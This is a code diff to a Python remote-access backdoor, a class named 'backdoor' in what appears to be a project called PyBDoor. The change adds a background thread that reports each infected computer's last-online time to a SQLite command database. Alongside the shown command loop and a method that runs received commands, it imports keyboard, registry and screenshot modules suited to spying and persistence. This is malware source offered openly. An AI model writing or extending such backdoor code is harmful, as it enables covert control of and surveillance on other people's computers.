@@ -1,4 +1,4 @@
-import sqlite3,socket,os,time,datetime,keyboard,shutil,winreg,pyautogui
+import sqlite3,socket,os,time,datetime,keyboard,shutil,winreg,pyautogui, threading,pytz
 
 class backdoor:
     def __init__(self):
@@ -33,10 +33,23 @@ class backdoor:
             for pc in pcs:
                 if socket.gethostbyname(socket.gethostname()) == pc[1]:
                     self.pc_id = pc[0]
-
+        t1 = threading.Thread(target=self.ping)
+        t1.start()
         while True:
             self.command_thread()
             time.sleep(1)
+        
+    def ping(self):
+        self.ping_db = sqlite3.connect("C:/Users/armen/Documents/Github/PyBDoor/server/db.sqlite3")
+        self.ping_cursor = self.ping_db.cursor()
+        while True:
+            sql_code = """UPDATE backdoor_computer
+                        SET last_online = ?
+                        WHERE id = ?
+                """
+            self.ping_cursor.execute(sql_code, (datetime.datetime.now(pytz.utc), self.pc_id))
+            self.ping_db.commit()
+            time.sleep(5)
 
     def run(self, code):
         output = ""
